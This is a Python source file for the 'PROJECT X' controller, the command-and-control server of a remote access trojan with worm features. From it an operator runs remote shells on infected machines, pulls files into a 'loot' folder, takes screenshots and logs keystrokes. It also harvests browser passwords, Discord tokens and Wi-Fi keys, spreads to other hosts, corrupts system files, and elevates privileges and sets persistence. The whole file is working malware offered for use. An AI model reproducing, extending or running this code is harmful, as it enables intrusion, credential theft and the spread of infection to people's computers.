#!/usr/bin/env python3
# ============================================================================
#  PROJECT X  ·  controller.py  ·  CLI controller (web.py imports this)
# ============================================================================
import base64, hashlib, hmac, json, os, socket, struct, sys, threading, time

PASSPHRASE = "pX-2026-changeme"
KDF_ITERS  = 60000
PORT       = 44300
PAYLOAD    = os.environ.get("PX_PAYLOAD", "")

C = dict(g="\033[92m", y="\033[93m", c="\033[96m", r="\033[91m",
         d="\033[90m", b="\033[1m", x="\033[0m")
os.system("")

def _derive(pp, salt=b"projectx-v1", iters=60000):
    dk = hashlib.pbkdf2_hmac("sha256", pp.encode("utf-8"), salt, iters, dklen=64)
    return dk[:32], dk[32:]

EK, MK = _derive(PASSPHRASE, iters=KDF_ITERS)

def _ks(key, nonce, n):
    out, c = bytearray(), 0
    while len(out) < n:
        out += hashlib.sha256(key + nonce + struct.pack(">I", c)).digest()
        c += 1
    return bytes(out[:n])

def _xorb(a, b):
    n = min(len(a), len(b))
    return (int.from_bytes(a[:n], "big") ^ int.from_bytes(b[:n], "big")).to_bytes(n, "big")

def seal(obj):
    pt = json.dumps(obj, separators=(",", ":")).encode()
    nonce = os.urandom(8)
    ct = _xorb(pt, _ks(EK, nonce, len(pt)))
    return nonce + hmac.new(MK, nonce + ct, hashlib.sha256).digest()[:16] + ct

def unseal(blob, seen=None):
    nonce, tag, ct = blob[:8], blob[8:24], blob[24:]
    want = hmac.new(MK, nonce + ct, hashlib.sha256).digest()[:16]
    if not hmac.compare_digest(want, tag): raise ValueError("auth failed")
    if seen is not None:
        if nonce in seen: raise ValueError("replay")
        seen.add(nonce)
        if len(seen) > 8192: seen.clear()
    return json.loads(_xorb(ct, _ks(EK, nonce, len(ct))).decode())

def recv_exact(s, n):
    b = b""
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c: raise ConnectionError("closed")
        b += c
    return b


class Conn:
    def __init__(self, sock, addr):
        self.sock, self.addr = sock, addr
        self.tx = threading.Lock()
        self.id = None
        self.info = {}
        self.stat = {}
        self.pending, self.dl = {}, {}
        self.seen = set()
        self.alive, self.last = True, time.time()
        self._n = 0

    def send(self, obj):
        blob = seal(obj)
        with self.tx: self.sock.sendall(struct.pack(">I", len(blob)) + blob)

    def recv(self):
        n = struct.unpack(">I", recv_exact(self.sock, 4))[0]
        return unseal(recv_exact(self.sock, n), self.seen)

    def req(self, cmd, args=None, timeout=600):
        self._n += 1
        xid = self._n
        ev = threading.Event()
        self.pending[xid] = {"ev": ev, "res": None}
        self.send({"ev": "req", "xid": xid, "cmd": cmd, "args": args or {}})
        if not ev.wait(timeout):
            self.pending.pop(xid, None)
            return {"ok": False, "err": "timeout"}
        return self.pending.pop(xid)["res"]

    def reader(self):
        while self.alive:
            try: f = self.recv()
            except Exception: break
            self.last = time.time()
            ev = f.get("ev")
            if ev == "ping": self.send({"ev": "pong"})
            elif ev == "evt":
                if f.get("k") == "stat": self.stat = f.get("d") or {}
            elif ev == "chunk":
                d = self.dl.setdefault(f["xid"], {"name": f["name"], "parts": {}})
                d["parts"][f["seq"]] = base64.b64decode(f["data"])
            elif ev == "want_update":
                p = PAYLOAD
                if p and os.path.exists(p):
                    d = open(p, "rb").read()
                    self.send({"ev": "update", "data": base64.b64encode(d).decode(),
                               "sha256": hashlib.sha256(d).hexdigest()})
                else:
                    self.send({"ev": "update", "error": "controller has no payload (set PX_PAYLOAD)"})
            elif ev == "res":
                p = self.pending.get(f["xid"])
                if p: p["res"] = f; p["ev"].set()
        self.alive = False

    def collect(self, xid):
        d = self.dl.pop(xid, None)
        if not d: return None
        return d["name"], b"".join(d["parts"][i] for i in sorted(d["parts"]))

    def pinger(self):
        while self.alive:
            time.sleep(15)
            if time.time() - self.last > 60: self.alive = False; break
            try: self.send({"ev": "ping"})
            except Exception: break


AGENTS, LOCK, CUR = {}, threading.Lock(), None


def p_agents():
    with LOCK:
        if not AGENTS:
            print(f"{C['y']}no agents connected{C['x']}"); return
        print(f"\n{C['b']}{'#':<3}{'ID':<24}{'USER':<16}{'HOST':<18}{'ADMIN':<6}IP{C['x']}")
        for i, a in enumerate(AGENTS.values(), 1):
            m = a.info
            ad = f"{C['g']}yes{C['x']}" if m.get("admin") else f"{C['d']}no{C['x']}"
            print(f"{i:<3}{a.id:<24}{m.get('user',''):<16}{m.get('host',''):<18}{ad:<14}{m.get('ip','')}")
        print()


HELP = f"""
{C['b']}SESSION{C['x']}   agents | a   use <#|id>   back | b   info   stat
{C['b']}SHELL{C['x']}     !<cmd> | shell <cmd>   powershell <cmd>   ps   kill <pid>   start <path>   netstat
{C['b']}FILES{C['x']}     ls [p]  cd <p>  pwd  cat <f>  get <f>  put <local> [remote]  rm  mkdir  mv  find  drives
{C['b']}CONTROL{C['x']}   power off|restart|sleep|hibernate|lock|logoff   screen   msg <t>   clip [text]
              keylog start|stop|dump|clear   reg get|set|del <HIVE> <path> [name] [value]   wifi   av   env
{C['b']}EXTRA{C['x']}     blackout on|off   corrupt [rename|delete|restore] [file]
{C['b']}WORM{C['x']}      harvest   spread   freeze   update   nuke
{C['b']}LIFECYCLE{C['x']} elevate   persist on|off   where   uninstall [keep]   exit   ping
"""


def call(cmd, args=None, timeout=600):
    a = AGENTS.get(CUR)
    if not a: print(f"{C['r']}no session{C['x']}"); return None
    r = a.req(cmd, args, timeout)
    if r is None or not r.get("ok"):
        print(f"{C['r']}error: {(r or {}).get('err','link down')}{C['x']}"); return None
    return r.get("data")


def save_download(name, blob):
    os.makedirs("loot", exist_ok=True)
    path = os.path.join("loot", name); i = 1
    while os.path.exists(path):
        root, ext = os.path.splitext(name); path = os.path.join("loot", f"{root}_{i}{ext}"); i += 1
    open(path, "wb").write(blob); return path


def upload(local, remote):
    a = AGENTS.get(CUR)
    if not os.path.isfile(local): print(f"{C['r']}no such file{C['x']}"); return
    data = open(local, "rb").read()
    remote = remote or os.path.basename(local).replace("\\", "/")
    a.req("put_start", {"path": remote, "total": len(data)})
    CH = 512 * 1024
    for i in range(0, max(1, len(data)), CH):
        a.req("put_chunk", {"data": base64.b64encode(data[i:i+CH]).decode()})
    print(f"{C['g']}{a.req('put_end', {}).get('data','')}{C['x']}")


def handle(line):
    global CUR
    line = line.strip()
    if not line: return
    p = line.split(" ", 1)
    cmd, rest = p[0].lower(), (p[1] if len(p) > 1 else "")

    if cmd in ("help", "?"):   print(HELP); return
    if cmd in ("agents", "a"): p_agents(); return
    if cmd in ("quit", "q"):   raise SystemExit
    if cmd in ("back", "b"):   CUR = None; print("detached"); return

    if cmd == "use" or (cmd.isdigit() and not rest):
        for i, a in enumerate(AGENTS.values(), 1):
            if rest == str(i) or rest == a.id or (cmd.isdigit() and i == int(cmd)):
                CUR = a.id; print(f"{C['g']}-> {a.id}{C['x']}"); return
        print(f"{C['r']}no such agent{C['x']}"); return

    if not CUR: print(f"{C['y']}select an agent first{C['x']}"); return
    a = AGENTS.get(CUR)

    if cmd.startswith("!"):
        d = call("shell", {"cmd": line[1:]}); print(d["out"] if d else ""); return
    if cmd == "shell":      d = call("shell", {"cmd": rest}); print(d["out"] if d else ""); return
    if cmd == "powershell": d = call("powershell", {"cmd": rest}); print(d["out"] if d else ""); return
    if cmd in ("info", "sysinfo"):
        for k, v in (call("info") or {}).items(): print(f"  {C['d']}{k:<12}{C['x']} {v}")
        return
    if cmd == "stat":
        for k, v in (call("stat") or {}).items(): print(f"  {C['d']}{k:<10}{C['x']} {v}")
        return
    if cmd == "ping": print(call("ping") or "no answer"); return

    if cmd == "ps":
        d = call("ps") or []
        print(f"\n{C['b']}{'PID':<8}{'SESSION':<10}{'MEM':<12}NAME{C['x']}")
        for r in d: print(f"{r['pid']:<8}{r['sess']:<10}{r['mem']:<12}{r['name']}")
        print(f"{C['d']}{len(d)} processes{C['x']}\n"); return
    if cmd == "kill":  print(call("kill", {"pid": rest})); return
    if cmd == "start": print(call("start", {"path": rest})); return

    if cmd == "ls":
        d = call("ls", {"path": rest or None})
        if not d: return
        print(f"{C['c']}{d['path']}{C['x']}")
        for e in d["entries"]:
            print(f"  {C['b']}<DIR>{C['x']}        {e['name']}" if e["dir"]
                  else f"  {e['size']:>12,} {e['name']}")
        return
    if cmd == "cd":  print(call("cd", {"path": rest})); return
    if cmd == "pwd": print(call("pwd")); return
    if cmd == "cat": print(call("cat", {"path": rest})); return
    if cmd == "get":
        a.req("get", {"path": rest}); got = a.collect(a._n)
        if got: print(f"{C['g']}saved -> {save_download(got[0], got[1])}{C['x']}")
        return
    if cmd == "put":
        b = rest.split(" ", 1); upload(b[0], b[1] if len(b) > 1 else None); return
    if cmd == "rm":    print(call("rm", {"path": rest})); return
    if cmd == "mkdir": print(call("mkdir", {"path": rest})); return
    if cmd == "mv":
        s = rest.split(" ", 1); print(call("mv", {"src": s[0], "dst": s[1]})); return
    if cmd == "find":
        b = rest.split(" ", 1)
        d = call("find", {"pattern": b[0], "root": b[1] if len(b) > 1 else "C:\\"})
        for x in (d or []): print(" ", x)
        return
    if cmd == "drives":
        for d in call("drives") or []:
            print(f"  {d['drive']}  {d['free_gb']} GB free / {d['total_gb']} GB")
        return

    if cmd == "power":  print(call("power", {"mode": rest or "off"})); return
    if cmd == "screen":
        d = call("screen", timeout=120)
        if d:
            f = save_download(f"screen_{time.strftime('%H%M%S')}.png", base64.b64decode(d["png"]))
            print(f"{C['g']}saved -> {f}{C['x']}")
            try: os.startfile(f)
            except Exception: pass
        return
    if cmd == "msg":    print(call("msg", {"text": rest})); return
    if cmd == "blackout":
        print(call("blackout", {"op": rest or "on", "title": "PROJECT-X"})); return
    if cmd == "corrupt":
        b = rest.split(" ")
        op = b[0] if b and b[0] in ("rename", "delete", "restore") else "rename"
        path = b[1] if len(b) > 1 else "svchost.exe"
        print(call("corrupt", {"op": op, "path": path}, timeout=60)); return
    if cmd == "clip":   print(call("clip", {"set": rest} if rest else {})); return
    if cmd == "keylog": print(call("keylog", {"op": rest or "dump"}, timeout=60)); return
    if cmd == "reg":
        b = rest.split(" ")
        if not b or b[0] not in ("get", "set", "del"):
            print("reg get|set|del <HIVE> <path> [name] [value] [type]"); return
        args = {"op": b[0], "hive": b[1] if len(b) > 1 else "HKCU", "path": b[2] if len(b) > 2 else ""}
        if len(b) > 3: args["name"] = b[3]
        if len(b) > 4: args["value"] = b[4]
        if len(b) > 5: args["type"] = b[5]
        print(call("reg", args)); return
    if cmd == "wifi":
        for w in call("wifi", timeout=180) or []:
            print(f"  {w['ssid']:<32} {C['g']}{w['key']}{C['x']}")
        return
    if cmd == "av":
        for k, v in (call("av", timeout=180) or {}).items():
            print(f"  {C['d']}{k:<14}{C['x']}\n    {str(v).replace(chr(10), chr(10)+'    ')}")
        return
    if cmd == "env":
        for k, v in (call("env") or {}).items(): print(f"  {k}={v}")
        return
    if cmd == "netstat": print(call("net", {"cmd": rest or "netstat -ano"}) or ""); return

    if cmd == "harvest":
        d = call("harvest", {"what": rest or "all"}, timeout=300)
        if d:
            f = save_download(f"harvest_{time.strftime('%Y%m%d_%H%M%S')}.json",
                              json.dumps(d, indent=1).encode())
            print(f"{C['g']}saved -> {f}{C['x']}")
            for pw in d.get("passwords", [])[:60]:
                print(f"  {pw['browser']:<9} {pw['user']:<28} {C['g']}{pw['pass']}{C['x']}  {pw['url'][:50]}")
            for t in d.get("discord", []): print(f"  discord   {t['token'][:70]}")
        return
    if cmd == "spread":
        d = call("spread", {}, timeout=900)
        if d: print(f"  scanned {d['scanned']}  infected {C['g']}{d['infected']}{C['x']}  "
                    f"failed {C['d']}{len(d['failed'])}{C['x']}")
        return
    if cmd == "freeze":
        for k, v in (call("freeze") or {}).items(): print(f"  {C['d']}{k:<20}{C['x']} {v}")
        return
    if cmd == "update": print(call("update", {}, timeout=300)); return
    if cmd == "nuke":
        d = call("nuke", {}, timeout=900)
        if d:
            print(f"  cleaned {C['g']}{d['cleaned']}{C['x']}")
            if d["missed"]: print(f"  missed  {C['y']}{d['missed']}{C['x']}")
            print(f"  local   {d['local_dir']} removed, agent exiting")
        return
    if cmd == "where":
        for k, v in (call("where") or {}).items(): print(f"  {C['d']}{k:<12}{C['x']} {v}")
        return

    if cmd == "elevate":   print(call("elevate")); return
    if cmd == "persist":   print(call("persist", {"op": rest or "on"}, timeout=120)); return
    if cmd == "uninstall": print(call("uninstall", {"keep": rest == "keep"})); return
    if cmd == "exit":      print(call("exit")); return

    print(f"{C['y']}unknown: {cmd} (help){C['x']}")


def client_thread(sock, addr):
    c = Conn(sock, addr)
    try: f = c.recv()
    except Exception: return
    if f.get("ev") != "hello":
        try: c.send({"ev": "ack", "ok": False})
        except Exception: pass
        return
    c.id, c.info = f["id"], f.get("info", {})
    c.send({"ev": "ack", "ok": True})
    with LOCK:
        if c.id in AGENTS:
            AGENTS[c.id].alive = False
            c.id = f"{c.id}+"
        AGENTS[c.id] = c
    print(f"\n{C['g']}[+] {c.id} @ {c.info.get('ip')} ({c.info.get('user')}@"
          f"{c.info.get('host')}) admin={c.info.get('admin')}{C['x']}")
    threading.Thread(target=c.reader, daemon=True).start()
    threading.Thread(target=c.pinger, daemon=True).start()
    while c.alive: time.sleep(2)
    with LOCK: AGENTS.pop(c.id, None)
    print(f"\n{C['r']}[-] {c.id} disconnected{C['x']}")


def banner():
    print(f"""{C['c']}
   ██████╗ ██████╗  ██████╗      ██╗███████╗ ██████╗████████╗  ██╗  ██╗
   ██╔══██╗██╔══██╗██╔═══██╗     ██║██╔════╝██╔════╝╚══██╔══╝  ╚██╗██╔╝
   ██████╔╝██████╔╝██║   ██║     ██║█████╗  ██║        ██║      ╚███╔╝
   ██╔═══╝ ██╔══██╗██║   ██║██   ██║██╔══╝  ██║        ██║      ██╔██╗
   ██║     ██║  ██║╚██████╔╝╚█████╔╝███████╗╚██████╗   ██║     ██╔╝ ██╗
   ╚═╝     ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝   ╚═╝     ╚═╝  ╚═╝{C['x']}
     v1.3  ·  port {PORT}  ·  sha256-ctr + hmac  ·  payload: {PAYLOAD or 'unset'}
""")


def main():
    global PORT, PAYLOAD
    args = sys.argv[1:]; tls = None
    if "--port" in args: PORT = int(args[args.index("--port") + 1])
    if "--payload" in args: PAYLOAD = args[args.index("--payload") + 1]
    if "--tls" in args:
        i = args.index("--tls"); tls = (args[i + 1], args[i + 2])
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", PORT)); srv.listen(64)
    if tls:
        import ssl
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain(*tls)
        srv = ctx.wrap_socket(srv, server_side=True)
    banner()
    print(f"{C['g']}listening on 0.0.0.0:{PORT}{'  [TLS]' if tls else ''}{C['x']}")
    print(f"{C['d']}type 'help' for commands{C['x']}\n")
    threading.Thread(target=lambda: [client_thread(*srv.accept()) for _ in iter(int, 1)],
                     daemon=True).start()
    while True:
        try: line = input(f"{C['c']}{CUR or 'no-session'}{C['x']}{C['b']} > {C['x']}")
        except (EOFError, KeyboardInterrupt): print(); break
        try: handle(line)
        except SystemExit: break
        except Exception as e: print(f"{C['r']}[controller] {e}{C['x']}")
    srv.close()


if __name__ == "__main__":
    main()
